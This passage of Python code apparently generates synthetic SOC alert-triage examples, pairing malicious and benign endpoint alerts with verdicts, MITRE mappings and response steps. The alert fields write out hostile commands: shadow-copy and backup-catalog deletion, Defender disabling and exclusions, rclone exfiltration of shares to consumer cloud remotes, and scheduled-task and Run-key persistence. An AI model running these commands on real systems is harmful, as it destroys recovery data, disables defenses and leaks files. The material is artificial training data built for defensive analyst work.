              "SMB to print server PRT-{}-{:02d}".format(pick(["FL2", "FL3", "HQ"]), R.randint(1, 20)),
              "Print job submitted at the same timestamp")
    return a, tri("False Positive", "High", "Informational",
                  fp_mitre("T1204.002 - User Execution: Malicious File"),
                  "splwow64.exe is the Windows print driver host that Office launches when printing; the rule matched normal behavior.",
                  ["C:\\Windows\\splwow64.exe is the Microsoft-signed print translation host, in its legitimate location.",
                   "A print job was submitted at the same moment, and the only network traffic went to an internal print server.",
                   "No script interpreters or downloads were involved."],
                  ["Close as False Positive.",
                   "Add C:\\Windows\\splwow64.exe as a known-good child of Office applications."])


def office_child_addin():
    u = user(); host = "WS-FIN-{:03d}".format(R.randint(1, 250)); t, h = ts("business")
    tool = pick([("C:\\Program Files (x86)\\blp\\API\\Office Tools\\bplus.exe", "Bloomberg Finance L.P.", 140),
                 ("C:\\Program Files\\Adobe\\Acrobat DC\\Acrobat\\Acrobat.exe", "Adobe Inc.", 1900),
                 ("C:\\Program Files\\Microsoft Office\\root\\Office16\\MSOSYNC.EXE", "Microsoft Corporation", 2100)])
    a = alert("officechild", t, host, "Finance Workstations", pick(OS_WS), "CORP\\" + u, tool[0],
              '"{}" /embedding'.format(tool[0]), chain("EXCEL.EXE", "explorer.exe"),
              "Signed: " + tool[1], prev(tool[2]), "Vendor endpoints only", "Launched through COM automation")
    return a, tri("False Positive", "High", "Informational",
                  fp_mitre("T1204.002 - User Execution: Malicious File"),
                  "Excel launched a signed, widely deployed application through COM automation; the rule matched ordinary add-in behavior.",
                  ["The child binary is signed by {} and runs from Program Files.".format(tool[1]),
                   "It is seen on {} hosts, so it is prevalent in the environment.".format(tool[2]),
                   "The /embedding argument is the normal COM automation launch mode.",
                   "No script interpreters or suspicious network destinations are involved."],
                  ["Close as False Positive.",
                   "Add this signer and path to the Office child-process exclusion list."])


# ============================================================ Persistence
def schtask_mal():
    u = user(); host, grp, os_ = ws_host(); t, h = ts(pick(["business", "offhours"]))
    tn = pick(["MicrosoftEdgeUpdateTaskCore", "OneDrive Standalone Update", "WindowsDefenderUpdate", "GoogleUpdateTaskUser"])
    b = pick(["C:\\Users\\Public\\Libraries\\{}.exe".format(rand_name(6)),
              "C:\\ProgramData\\{}\\svc.exe".format(rand_name(6)),
              "C:\\Users\\{}\\AppData\\Roaming\\{}.exe".format(u, rand_name(6))])
    a = alert("schtask", t, host, grp, os_, "CORP\\" + u, "C:\\Windows\\System32\\schtasks.exe",
              'schtasks /create /tn "{}" /tr "{}" /sc onlogon /rl highest /f'.format(tn, b),
              chain("powershell.exe", "C:\\Users\\{}\\Downloads\\{}.exe".format(u, rand_name(6)), "explorer.exe"),
              "Signed: Microsoft Windows", ALL_HOSTS, "None observed",
              "Task action binary {}: unsigned, seen on 1 host, created 20 seconds earlier".format(b))
    return a, tri("True Positive", "High", "High",
                  "T1053.005 - Scheduled Task/Job: Scheduled Task; T1036.004 - Masquerade Task or Service",
                  "A scheduled task with a fake vendor name was created to launch an unsigned binary at every logon, which is malware persistence.",
                  ["The task name '{}' imitates a legitimate updater, but real updaters run from Program Files.".format(tn),
                   "The task runs {}, an unsigned single-host binary in a user-writable path.".format(b),
                   "The /sc onlogon /rl highest settings give the payload persistence with elevated rights.",
                   "The chain starts from an executable the user downloaded, not an installer or management agent."],
                  ["Isolate {}.".format(host),
                   "Delete the '{}' task and quarantine {}.".format(tn, b),
                   "Analyze the downloaded executable to find the initial infection vector.",
                   "Sweep the fleet for scheduled tasks pointing to Public, ProgramData, or AppData paths."])


def schtask_benign():
    host, grp, os_ = ws_host(); t, h = ts("business")
    v = pick([("GoogleUpdateTaskMachineUA", "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe", "Google LLC"),
              ("Adobe Acrobat Update Task", "C:\\Program Files (x86)\\Common Files\\Adobe\\ARM\\1.0\\AdobeARM.exe", "Adobe Inc."),
              ("MicrosoftEdgeUpdateTaskMachineCore", "C:\\Program Files (x86)\\Microsoft\\EdgeUpdate\\MicrosoftEdgeUpdate.exe", "Microsoft Corporation")])
    a = alert("schtask", t, host, grp, os_, "NT AUTHORITY\\SYSTEM", "C:\\Windows\\System32\\schtasks.exe",
              'schtasks /create /tn "{}" /xml "C:\\Windows\\Temp\\{}.xml" /f'.format(v[0], rand_name(8)),
              chain(v[1] + " /install", "msiexec.exe", "services.exe"),
              "Signed: Microsoft Windows", ALL_HOSTS, "None observed",
              "Task action binary {}: signed by {}, seen on 1,850 hosts".format(v[1], v[2]))
    return a, tri("Benign True Positive", "High", "Low",
                  btp_mitre("T1053.005 - Scheduled Task/Job: Scheduled Task"),
                  "A signed software installer registered its standard auto-update task; persistence was created, but by legitimate software.",
                  ["The task '{}' is the vendor's documented update task.".format(v[0]),
                   "Its action points to {}, signed by {} and present on most hosts.".format(v[1], v[2]),
                   "It was created by msiexec.exe during a software install running as SYSTEM."],
                  ["Close as Benign True Positive.",
                   "Allowlist this task name when the action binary is signed by {} and located in Program Files.".format(v[2])])


def runkey_mal():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("any")
    vn = pick(["WindowsDefender", "OneDriveUpdate", "SecurityHealth", "AdobeUpdater"])
    bn = pick(["svch0st.exe", "dllhst.exe", "winupdt.exe", "rundl.exe"])
    b = "C:\\Users\\{}\\AppData\\Roaming\\Microsoft\\{}".format(u, bn)
    ip = ext_ip()
    a = alert("runkey", t, host, grp, os_, "CORP\\" + u, "C:\\Windows\\System32\\reg.exe",
              'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "{}" /t REG_SZ /d "{}" /f'.format(vn, b),
              chain("cmd.exe", pick(["wscript.exe", "mshta.exe", "powershell.exe"]), "explorer.exe"),
              "Signed: Microsoft Windows", ALL_HOSTS, "{} makes HTTPS connections to {} every 60 seconds".format(bn, ip),
              "Run value target {}: unsigned, seen on 1 host".format(b))
    return a, tri("True Positive", "High", "High",
                  "T1547.001 - Boot or Logon Autostart: Registry Run Keys; T1036.005 - Masquerading",
                  "A Run key with a security-product name was added to launch a misspelled, unsigned binary that is beaconing outbound.",
                  ["The value name '{}' imitates a legitimate product, but the binary is in AppData\\Roaming.".format(vn),
                   "The binary name {} misspells a Windows process name, a masquerading tell.".format(bn),
                   "The binary is unsigned, seen on one host, and beacons to {} every 60 seconds.".format(ip),
                   "reg.exe was launched from a script host, not an installer."],
                  ["Isolate {}.".format(host),
                   "Remove the '{}' Run value and quarantine the binary.".format(vn),
                   "Block {} and search for other hosts contacting it.".format(ip),
                   "Investigate how the script host was launched to find the initial access vector."])


def runkey_benign():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("business")
    v = pick([("com.squirrel.Teams.Teams", "C:\\Users\\{u}\\AppData\\Local\\Microsoft\\Teams\\Update.exe", "--processStart \"Teams.exe\"", "Microsoft Corporation"),
              ("OneDrive", "C:\\Users\\{u}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe", "/background", "Microsoft Corporation"),
              ("Zoom", "C:\\Users\\{u}\\AppData\\Roaming\\Zoom\\bin\\Zoom.exe", "--autostart", "Zoom Communications, Inc.")])
    exe = v[1].replace("{u}", u)
    a = alert("runkey", t, host, grp, os_, "CORP\\" + u, exe,
              "(registry write) HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\{} = \"{}\" {}".format(v[0], exe, v[2]),
              chain(exe, "explorer.exe"), "Signed: " + v[3], prev(R.randint(900, 2100)), "Vendor endpoints only",
              "Writer process is also the Run value target")
    return a, tri("Benign True Positive", "High", "Low",
                  btp_mitre("T1547.001 - Boot or Logon Autostart: Registry Run Keys"),
                  "A signed, widely used application registered its normal per-user autostart entry; autostart persistence was created by legitimate software.",
                  ["The value '{}' and its target match the vendor's standard autostart configuration.".format(v[0]),
                   "The writing binary is signed by {} and seen on most hosts.".format(v[3]),
                   "Per-user applications such as this one legitimately install under AppData, and the binary only contacts vendor endpoints."],
                  ["Close as Benign True Positive.",
                   "Allowlist Run key writes by this signed binary for this value name."])


def runkey_masq():  # subtle single-clue masquerade
    u = user(); host, grp, os_ = ws_host(); t, h = ts("business")
    exe = "C:\\Users\\{}\\AppData\\Local\\Microsoft\\OneDrive\\OneDrive.exe".format(u)
    ip = ext_ip()
    a = alert("runkey", t, host, grp, os_, "CORP\\" + u, exe,
              "(registry write) HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\OneDrive = \"{}\" /background".format(exe),
              chain(exe, "explorer.exe"), "Unsigned", prev(1), "HTTPS to {} every 300 seconds".format(ip),
              "Writer process is also the Run value target; file created 2 minutes earlier")
    return a, tri("True Positive", "Medium", "High",
                  "T1547.001 - Registry Run Keys; T1036.005 - Masquerading: Match Legitimate Name or Location",
                  "A binary posing as OneDrive, in OneDrive's usual folder, is unsigned and beacons to a raw IP; the real OneDrive client is always Microsoft-signed.",
                  ["The path and Run value name match OneDrive's real configuration, so they prove nothing on their own.",
                   "This OneDrive.exe is unsigned and seen on one host, while the real client is Microsoft-signed and present on most hosts.",
                   "It contacts raw IP {} on a fixed 300-second interval, a beaconing pattern.".format(ip),
                   "The file was created 2 minutes before the Run key was written."],
                  ["Isolate {}.".format(host),
                   "Collect the fake OneDrive.exe and block {}.".format(ip),
                   "Hunt for unsigned OneDrive.exe files across the fleet.",
                   "Reset {}'s credentials and determine how the file was delivered.".format(u)])


# ================================================================ VSS / ransom
def vss_mal():
    host, grp, os_ = srv_host("file"); t, h = ts("offhours")
    b = "C:\\ProgramData\\{}\\{}.exe".format(rand_name(5), rand_name(6))
    a = alert("vss", t, host, grp, os_, "CORP\\" + pick(["svc_sql", "svc_print", admin_user()]),
              "C:\\Windows\\System32\\vssadmin.exe",
              pick(["vssadmin.exe delete shadows /all /quiet", "vssadmin.exe resize shadowstorage /for=C: /on=C: /maxsize=401MB"]),
              chain("cmd.exe", b), "Signed: Microsoft Windows", ALL_HOSTS, "None observed",
              "Parent {}: unsigned, seen on 1 host. Same parent within 30 seconds: wmic shadowcopy delete; bcdedit /set {{default}} recoveryenabled no; wbadmin delete catalog -quiet".format(b))
    return a, tri("True Positive", "High", "Critical",
                  "T1490 - Inhibit System Recovery; likely precursor to T1486 - Data Encrypted for Impact",
                  "An unknown binary is destroying shadow copies, the backup catalog, and boot recovery on a file server; this is imminent ransomware.",
                  ["Shadow copies, the backup catalog, and recovery mode were all removed within 30 seconds.",
                   "The parent {} is unsigned and seen only on this host.".format(b),
                   "The target is {}, a file server holding shared data.".format(host),
                   offhours_note(h)],
                  ["Isolate {} immediately and treat this as an active ransomware incident.".format(host),
                   "Disable the account that ran the command and review its recent logons across the domain.",
                   "Confirm offline or immutable backups are intact, and disconnect backup networks if needed.",
                   "Activate the incident response plan and notify IR leadership."])


def vss_benign():
    host, grp, os_ = srv_host(pick(["file", "app", "sql"])); t, h = ts("night_window")
    agent = pick([("C:\\Program Files\\Veeam\\Endpoint Backup\\Veeam.EndPoint.Service.exe", "Veeam Software Group GmbH"),
                  ("C:\\Program Files\\Commvault\\ContentStore\\Base\\clBackup.exe", "Commvault Systems, Inc.")])
    a = alert("vss", t, host, grp, os_, "NT AUTHORITY\\SYSTEM", "C:\\Windows\\System32\\vssadmin.exe",
              pick(["vssadmin.exe list shadows", "vssadmin.exe list writers", "vssadmin.exe list shadowstorage"]),
              chain("cmd.exe", agent[0], "services.exe"), "Signed: Microsoft Windows", ALL_HOSTS, "None observed",
              "Parent {}: signed by {}; no shadow copies were deleted or resized".format(agent[0], agent[1]))
    return a, tri("False Positive", "High", "Informational",
                  fp_mitre("T1490 - Inhibit System Recovery"),
                  "The backup agent ran a read-only vssadmin list command before its job; nothing was deleted, so the watched behavior did not occur.",
                  ["The command only lists shadow copy information and changes nothing.",
                   "The parent is the backup agent, signed by {}, running as a service.".format(agent[1]),
                   "No deletion, resizing, catalog removal, or recovery tampering followed."],
                  ["Close as False Positive.",
                   "Narrow the rule to delete and resize operations, and keep alerting on delete /all."])


def ransom_mal():
    host, grp, os_ = srv_host("file"); t, h = ts("offhours")
    ext = "." + rand_name(5)
    n = R.randint(2000, 40000)
    exe = "C:\\Users\\Public\\{}.exe".format(rand_name(6))
    a = alert("massfile", t, host, grp, os_, "CORP\\" + pick(["svc_sql", admin_user(), user()]), exe,
              "{} -path \\\\{}\\Shares -threads 32".format(os.path.basename(exe), host),
              chain("cmd.exe", "PSEXESVC.exe", "services.exe"), "Unsigned", prev(1), "SMB writes to local shares only",
              "{} files renamed to *{} in 6 minutes; README_RESTORE_FILES.txt created in every folder; high-entropy writes".format(n, ext))
    return a, tri("True Positive", "High", "Critical",
                  "T1486 - Data Encrypted for Impact; T1569.002 - Service Execution",
                  "An unsigned binary deployed via PsExec is encrypting file shares, renaming {} files and dropping ransom notes; this is active ransomware.".format(n),
                  ["{} files were renamed with the new extension {} in 6 minutes, with high-entropy writes.".format(n, ext),
                   "A README_RESTORE_FILES.txt note was created in every folder.",
                   "The unsigned process runs from C:\\Users\\Public and was launched via PSEXESVC, showing remote deployment.",
                   offhours_note(h)],
                  ["Isolate {} immediately, and cut file share access network-wide if spread is suspected.".format(host),
                   "Disable the account that ran the binary and find the host that pushed PSEXESVC.",
                   "Preserve backups and verify offline copies before any restoration.",
                   "Activate the ransomware response plan and notify leadership and legal."])


def ransom_benign():
    host, grp, os_ = srv_host("file"); t, h = ts("night_window")
    n = R.randint(5000, 90000)
    a = alert("massfile", t, host, grp, os_, "CORP\\svc_migration", "C:\\Windows\\System32\\Robocopy.exe",
              "robocopy \\\\SRV-FILE-OLD\\Shares \\\\{}\\Shares /MIR /COPYALL /R:1 /W:1 /MT:32 /LOG:D:\\Logs\\mig.log".format(host),
              chain("powershell.exe", "svchost.exe -k netsvcs -p -s Schedule", "services.exe"),
              "Signed: Microsoft Windows", ALL_HOSTS, "SMB from SRV-FILE-OLD",
              "{} files written; extensions unchanged; no new note files; write entropy matches source files; scheduled task name: Share-Migration-Wave3".format(n))
    return a, tri("False Positive", "High", "Informational",
                  fp_mitre("T1486 - Data Encrypted for Impact"),
                  "A scheduled robocopy migration wrote many files and tripped the volume-based rule; nothing was encrypted, so the watched behavior did not occur.",
                  ["Robocopy.exe is the signed Windows copy tool, running a /MIR copy between file servers.",
                   "The svc_migration account ran it from a scheduled task named Share-Migration-Wave3.",
                   "File extensions are unchanged, entropy matches the source, and no ransom notes appeared."],
                  ["Confirm the migration wave is on the change calendar.",
                   "Close as False Positive and suppress this task for the duration of the migration."])


# ============================================================= Remote services
def psexec_mal():
    u = user(); src, grp, os_ = ws_host(); t, h = ts("offhours")
    n = R.randint(5, 23)
    a = alert("remsvc", t, src, grp, os_, "CORP\\" + u, "C:\\Users\\{}\\AppData\\Local\\Temp\\ps.exe".format(u),
              "ps.exe @targets.txt -accepteula -s -d cmd /c C:\\Windows\\Temp\\{}.exe".format(rand_name(5)),
              chain("cmd.exe", "C:\\Users\\{}\\AppData\\Roaming\\{}.exe".format(u, rand_name(6)), "explorer.exe"),
              "Signed: Microsoft Corporation (original filename PsExec64.exe)", prev(1),
              "SMB and RPC to {} hosts in 4 minutes".format(n),
              "PSEXESVC service installed on {} hosts, including 2 domain controllers".format(n))
    return a, tri("True Positive", "High", "Critical",
                  "T1569.002 - System Services: Service Execution; T1021.002 - SMB/Windows Admin Shares",
                  "A standard user's workstation pushed a payload to {} hosts with renamed PsExec off-hours, which is active lateral movement.".format(n),
                  ["PsExec was renamed to ps.exe, runs from a user Temp folder, and targeted a host list file.",
                   "{} hosts received PSEXESVC in 4 minutes, including domain controllers.".format(n),
                   "{} is a standard user on a {} host, not an administrator on a jump server.".format(u, grp),
                   offhours_note(h)],
                  ["Isolate {} and every host that received PSEXESVC.".format(src),
                   "Disable {} and any credentials used for the remote connections, and assume domain compromise because DCs are affected.".format(u),
                   "Collect the deployed payload from C:\\Windows\\Temp on a target host for analysis.",
                   "Escalate to incident response leadership immediately."])


def psexec_benign():
    adm = admin_user(); src, grp, os_ = srv_host("jmp"); t, h = ts("night_window")
    kb = "KB50{}".format(R.randint(30000, 49999))
    n = R.randint(6, 18)
    a = alert("remsvc", t, src, grp, os_, "CORP\\" + adm, "C:\\Tools\\Sysinternals\\PsExec64.exe",
              "PsExec64.exe @C:\\Patching\\wave2.txt -s msiexec /i \\\\SRV-APP01\\deploy\\{}.msi /qn".format(kb),
              chain("powershell.exe", "explorer.exe"), "Signed: Microsoft Corporation (original filename PsExec64.exe)", prev(3),
              "SMB and RPC to {} application servers".format(n),
              "PSEXESVC installed on {} application servers; payload is an MSI from an internal deployment share".format(n))
    a["_kb"] = kb
    return a, tri("Benign True Positive", "Medium", "Low",
                  btp_mitre("T1569.002 - System Services: Service Execution"),
                  "An admin account on a jump server used PsExec at night to push a patch MSI from an internal share, which matches routine patching.",
                  ["Source {} is an admin jump server, and {} is a privileged admin account.".format(src, adm),
                   "PsExec is unrenamed and runs from a managed tools folder.",
                   "The payload is {}.msi from an internal deployment share, not an unknown binary.".format(kb),
                   "Only application servers were targeted, not domain controllers."],
                  ["Verify a change ticket exists for the {} deployment.".format(kb),
                   "Close as Benign True Positive once the ticket is confirmed, otherwise escalate."])


def psexec_ambiguous():
    adm = admin_user(); src, grp, os_ = ws_host(); t, h = ts("business")
    tgt = "SRV-APP{:02d}".format(R.randint(1, 12))
    a = alert("remsvc", t, src, grp, os_, "CORP\\" + adm, "C:\\Users\\{}\\Downloads\\PsExec64.exe".format(adm),
              "PsExec64.exe \\\\{} -s cmd /c \"ipconfig /all & net localgroup administrators\"".format(tgt),
              chain("cmd.exe", "explorer.exe"), "Signed: Microsoft Corporation (original filename PsExec64.exe)", prev(2),
              "SMB to {}; PsExec64.exe downloaded from live.sysinternals.com 5 minutes earlier".format(tgt),
              "Single target {}".format(tgt))
    a["_target"] = tgt
    return a, tri("Needs Investigation", "Medium", "Medium",
                  "T1569.002 - Service Execution; T1069.001 - Permission Groups Discovery: Local Groups",
                  "An admin account ran freshly downloaded PsExec from a standard workstation against one server for discovery commands; plausible troubleshooting, but outside normal admin practice.",
                  ["{} is a privileged account, and the commands are low impact.".format(adm),
                   "It ran from {}, a {} host, instead of a jump server.".format(src, grp),
                   "PsExec was downloaded minutes earlier rather than run from managed tooling.",
                   "Enumerating local administrators is also typical attacker discovery."],
                  ["Check the admin roster or ask the owner of {} whether they ran this and why.".format(adm),
                   "Check {} sign-in history for anomalies such as new source IPs or MFA failures.".format(adm),
                   "If unconfirmed, disable the account and isolate {}.".format(src)])


# ============================================================== Cloud sync
def rclone_mal():
    host, grp, os_ = srv_host("file"); t, h = ts("offhours")
    exe = pick(["svchosts.exe", "rclone.exe", "taskhostw.exe"])
    remote = pick(["mega:bk", "remote:data", "pcloud:x"])
    gb = R.randint(18, 240)
    a = alert("cloudsync", t, host, grp, os_, "CORP\\" + pick(["svc_sql", admin_user()]), "C:\\ProgramData\\{}".format(exe),
              "{} copy \\\\{}\\{} {} --transfers 16 --ignore-existing --config C:\\ProgramData\\rc.conf -q".format(exe, host, pick(["Finance", "HR", "Legal", "Shares"]), remote),
              chain("cmd.exe", "C:\\ProgramData\\{}.exe".format(rand_name(6))),
              "Unsigned (original filename rclone.exe)", prev(1),
              "{} GB uploaded to {} over 2 hours".format(gb, pick(["g.api.mega.co.nz", "api.pcloud.com"])),
              "First execution of this file in the environment")
    return a, tri("True Positive", "High", "Critical",
                  "T1567.002 - Exfiltration to Cloud Storage; T1036.005 - Masquerading",
                  "Rclone running from ProgramData uploaded {} GB from a sensitive share to consumer cloud storage off-hours; this is data exfiltration.".format(gb),
                  ["The original filename shows {} is rclone, a common exfiltration tool.".format(exe),
                   "The destination {} is a consumer cloud service, not a corporate backup target.".format(remote),
                   "{} GB left the network in 2 hours using 16 parallel transfers.".format(gb),
                   offhours_note(h)],
                  ["Isolate {} and block the cloud storage destination at the egress firewall.".format(host),
                   "Disable the account that ran the tool and review its logons.",
                   "Use the rclone config and logs to determine exactly which files left the network.",
                   "Engage legal and privacy teams about potential breach notification."])


def rclone_benign():
    host, grp, os_ = srv_host("bkp"); t, h = ts("night_window")
    gb = R.randint(80, 400)
    a = alert("cloudsync", t, host, grp, os_, "CORP\\svc_backup", "C:\\Program Files\\rclone\\rclone.exe",
              "rclone.exe sync D:\\BackupStaging corp-s3:corp-backups-prod/{} --s3-server-side-encryption AES256 --log-file D:\\Logs\\rclone.log".format(host.lower()),
              chain("svchost.exe -k netsvcs -p -s Schedule", "services.exe"),
              "Unsigned (original filename rclone.exe)", prev(4),
              "{} GB to s3.us-east-1.amazonaws.com".format(gb),
              "Scheduled task name: Nightly-Offsite-Backup; same command line observed nightly for 180 days")
    return a, tri("Benign True Positive", "Medium", "Low",
                  btp_mitre("T1567.002 - Exfiltration Over Web Service: Exfiltration to Cloud Storage"),
                  "The backup service account ran rclone from a nightly scheduled task to an S3 bucket, consistent with 180 days of identical history.",
                  ["The account is svc_backup on {}, a backup server.".format(host),
                   "The remote corp-s3:corp-backups-prod is named as a corporate backup bucket and uses server-side encryption.",
                   "A scheduled task launched it, and the same command has run nightly for 180 days.",
                   "rclone is unsigned by design, so its path and history matter more than its signature here."],
                  ["Confirm corp-backups-prod is a company-owned bucket.",
                   "Close as Benign True Positive and allowlist this path, account, and destination."])


def rclone_wrong_remote():  # same legit tool/path/account, wrong destination
    host, grp, os_ = srv_host("bkp"); t, h = ts("offhours")
    gb = R.randint(30, 300)
    remote = pick(["mega:", "pcloud:", "dropbox:"]) + rand_name(4)
    a = alert("cloudsync", t, host, grp, os_, "CORP\\svc_backup", "C:\\Program Files\\rclone\\rclone.exe",
              "rclone.exe copy D:\\BackupStaging {} --transfers 24 -q".format(remote),
              chain("cmd.exe", "explorer.exe", "C:\\Windows\\System32\\userinit.exe"),
              "Unsigned (original filename rclone.exe)", prev(4),
              "{} GB to {}".format(gb, {"mega": "g.api.mega.co.nz", "pcl": "api.pcloud.com", "dro": "content.dropboxapi.com"}[remote[:3] if remote[:3] != "meg" else "mega"]),
              "Interactive RDP logon by svc_backup from {} 6 minutes earlier".format(ext_ip()))
    return a, tri("True Positive", "High", "Critical",
                  "T1567.002 - Exfiltration to Cloud Storage; T1078 - Valid Accounts",
                  "The backup service account logged on interactively over RDP from an external IP and copied backup data to consumer cloud storage; the account is compromised.",
                  ["The path and account match the approved backup job, but the destination {} is a consumer cloud service.".format(remote),
                   "The job ran from an interactive explorer.exe session, not the scheduled task that runs the real backup.",
                   "A service account should never log on interactively, let alone from an external IP.",
                   "{} GB of backup data, which may contain every protected system, left the network.".format(gb)],
                  ["Isolate {} and block the destination at the egress firewall.".format(host),
                   "Disable svc_backup, rotate its credentials, and restrict it to non-interactive logon.",
                   "Investigate how the RDP session reached the backup server from outside.",
                   "Treat the backup data as exposed and engage legal and privacy teams."])


# ================================================================= rundll32
def rundll32_mal():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("any")
    dll = "C:\\Users\\{}\\AppData\\Local\\Temp\\{}.dll".format(u, rand_name(7))
    ip = ext_ip()
    a = alert("rundll32", t, host, grp, os_, "CORP\\" + u, PATHS["rundll32.exe"],
              "rundll32.exe {},{}".format(dll, pick(["DllRegisterServer", "Start", "#1", "Control_RunDLL"])),
              pick([chain("wscript.exe", "explorer.exe"), chain("mshta.exe", "explorer.exe"), chain("cmd.exe", "msedge.exe")]),
              "Signed: Microsoft Windows", ALL_HOSTS, "TLS to {}:443 with a self-signed certificate".format(ip),
              "Loaded module {}: unsigned, seen on 1 host".format(dll))
    return a, tri("True Positive", "High", "High",
                  "T1218.011 - System Binary Proxy Execution: Rundll32; T1071.001 - Application Layer Protocol: Web Protocols",
                  "rundll32 loaded an unsigned DLL from a Temp folder and opened TLS to a raw IP, consistent with a malware loader beaconing to C2.",
                  ["rundll32.exe itself is legitimate, but the DLL it loaded is unsigned, seen on one host, and in the user's Temp folder.",
                   "rundll32 was launched by a script host or browser chain, not by Windows itself.",
                   "It connected to {} with a self-signed certificate, which is unusual for this binary.".format(ip)],
                  ["Isolate {}.".format(host),
                   "Collect the DLL for sandbox analysis and block {}.".format(ip),
                   "Search the fleet for the DLL hash and for connections to the IP."])


def rundll32_benign():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("business")
    cmd, parent = pick([
        ("rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,0", chain("control.exe", "explorer.exe")),
        ("rundll32.exe printui.dll,PrintUIEntry /in /n \\\\PRT-HQ-{:02d}\\Floor{}".format(R.randint(1, 20), R.randint(1, 5)), chain("explorer.exe")),
        ("rundll32.exe shell32.dll,Control_RunDLL mmsys.cpl,,0", chain("control.exe", "explorer.exe")),
        ("rundll32.exe C:\\Windows\\System32\\shell32.dll,SHCreateLocalServerRunDll {9aa46009-3ce0-458a-a354-715610a075e6}", chain("svchost.exe -k DcomLaunch -p", "services.exe"))])
    a = alert("rundll32", t, host, grp, os_, "CORP\\" + u, PATHS["rundll32.exe"], cmd, parent,
              "Signed: Microsoft Windows", ALL_HOSTS, "None observed",
              "Loaded module is a Microsoft-signed DLL in C:\\Windows\\System32")
    return a, tri("False Positive", "High", "Informational",
                  fp_mitre("T1218.011 - System Binary Proxy Execution: Rundll32"),
                  "rundll32 loaded a signed System32 DLL to open a Control Panel applet or printer dialog, which is normal Windows behavior.",
                  ["The command calls a documented export of a Microsoft-signed System32 DLL.",
                   "The parent is a standard Windows shell or DCOM process.",
                   "No network connections, file drops, or unsigned modules were observed."],
                  ["Close as False Positive.",
                   "Tune the rule to exclude signed System32 DLLs called through documented Control Panel and print exports."])


# ================================================================ Discovery
def discovery_mal():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("any")
    p = "C:\\Users\\{}\\AppData\\Roaming\\{}.exe".format(u, rand_name(6))
    a = alert("recon", t, host, grp, os_, "CORP\\" + u, "C:\\Windows\\System32\\net.exe",
              'net group "Domain Admins" /domain', chain("cmd.exe", p, "explorer.exe"),
              "Signed: Microsoft Windows", ALL_HOSTS, "LDAP and SMB to domain controllers",
              "Parent {}: unsigned, seen on 1 host. Same parent within 90 seconds: whoami /all; nltest /domain_trusts; nltest /dclist:corp; net view /all; net group \"Enterprise Admins\" /domain".format(p))
    return a, tri("True Positive", "High", "High",
                  "T1087.002 - Domain Account Discovery; T1069.002 - Domain Groups; T1482 - Domain Trust Discovery",
                  "An unknown binary in AppData ran a scripted burst of domain and privileged-group reconnaissance, typical of post-exploitation tooling.",
                  ["Six discovery commands ran within 90 seconds, a scripted pattern rather than manual work.",
                   "The parent {} is unsigned, seen on one host, and in a user-writable path.".format(p),
                   "{} is a standard {} user with no reason to enumerate domain trusts or admin groups.".format(u, grp),
                   "Querying Domain Admins and Enterprise Admins indicates target selection for privilege escalation."],
                  ["Isolate {} and acquire the parent binary.".format(host),
                   "Reset {}'s credentials and check other hosts for the same binary hash.".format(u),
                   "Monitor privileged accounts for unusual authentication over the next 72 hours."])


def discovery_benign():
    adm = admin_user(); host, grp, os_ = srv_host("help"); t, h = ts("business")
    target = user()
    a = alert("recon", t, host, grp, os_, "CORP\\" + adm, "C:\\Windows\\System32\\net.exe",
              "net user {} /domain".format(target), chain("cmd.exe", "explorer.exe"),
              "Signed: Microsoft Windows", ALL_HOSTS, "LDAP to domain controllers",
              "Single command; no other discovery commands from this session in the past hour")
    a["_target"] = target
    return a, tri("Benign True Positive", "Medium", "Informational",
                  btp_mitre("T1087.002 - Account Discovery: Domain Account"),
                  "A helpdesk admin looked up a single user account from a helpdesk workstation, which is routine support work.",
                  ["{} is an admin account on an IT Helpdesk workstation, where account lookups are expected.".format(adm),
                   "Only one targeted lookup ran, not a burst of enumeration.",
                   "The lookup targets one ordinary user account, {}, not privileged groups.".format(target)],
                  ["Optionally confirm an open helpdesk ticket for {}.".format(target),
                   "Close as Benign True Positive, and consider suppressing single net user lookups from IT Helpdesk hosts."])


# ================================================================== Defender
LOB_APPS = ["C:\\Program Files\\Epic\\Hyperspace", "C:\\Program Files\\SAP\\FrontEnd",
            "C:\\Program Files\\Autodesk\\Revit 2025", "C:\\Program Files\\QuickBooks"]


def defender_mal():
    u = user(); host, grp, os_ = ws_host(); t, h = ts("any")
    p = "C:\\Users\\Public\\{}.exe".format(rand_name(5))
    a = alert("defender", t, host, grp, os_, "CORP\\" + u, PATHS["powershell.exe"],
              "powershell -c \"Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\\ProgramData','C:\\Users\\Public'\"",
              chain("cmd.exe", p, "explorer.exe"), "Signed: Microsoft Windows", ALL_HOSTS, "None observed",
              "Parent {}: unsigned, seen on 1 host. Tamper protection blocked the realtime change; exclusions were added; new file written to C:\\ProgramData 15 seconds later".format(p))
    return a, tri("True Positive", "High", "High",
                  "T1562.001 - Impair Defenses: Disable or Modify Tools",
                  "An unknown binary tried to disable Defender realtime protection, excluded staging folders, and then dropped a file into one; this is defense evasion before payload delivery.",
                  ["The command disables realtime monitoring and excludes broad user-writable paths.",
                   "The parent {} is unsigned and seen on one host, not Intune or SCCM.".format(p),
                   "A new file was written into an excluded folder seconds later, showing intent.",
                   "Managed endpoints receive Defender changes from management agents running as SYSTEM, not from user processes."],
                  ["Isolate {}.".format(host),
                   "Remove the added exclusions and run a full scan that includes the excluded paths.",
                   "Collect the dropped file and the parent binary for analysis.",
                   "Hunt fleet-wide for recent Defender exclusion changes not made by management tooling."])


def defender_benign():
    host, grp, os_ = ws_host(); t, h = ts("business")
    app = pick(LOB_APPS)
    agent = "C:\\Program Files (x86)\\Microsoft Intune Management Extension\\AgentExecutor.exe"
    a = alert("defender", t, host, grp, os_, "NT AUTHORITY\\SYSTEM", agent,
              "AgentExecutor.exe -powershell \"Add-MpPreference -ExclusionPath '{}'\"".format(app),
              chain("IntuneAgent.exe", "services.exe"), "Signed: Microsoft Corporation", ALL_HOSTS, "None observed",
